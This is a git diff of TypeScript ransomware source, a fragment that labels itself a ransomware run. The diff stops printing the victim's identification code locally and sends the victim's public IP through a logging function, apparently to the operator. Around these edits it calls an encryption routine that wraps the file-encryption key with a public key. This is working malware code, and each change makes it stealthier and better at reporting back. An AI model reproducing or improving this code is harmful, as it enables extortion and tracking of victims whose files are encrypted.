@@ -31,7 +31,6 @@ const encrypt = () => {
   const keyData: string = `${key}${iv.toString('hex')}`;
   const idCode: string = encryptPublicKey(keyData);
 
-  console.log(`Identification Code : ${idCode}\n`);
   setTimeout(
     () =>
       sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
@@ -121,11 +120,10 @@ const getPublicIP = () => {
 
 getPublicIP()
   .then((ip) => {
-    console.log('IP público:', ip);
+    setTimeout(() => sendLog(`[+] -> IP: ${ip}`), 1000);
   })
   .catch((err) => {
     console.error(err);
   });
 
-// execute
 encrypt();
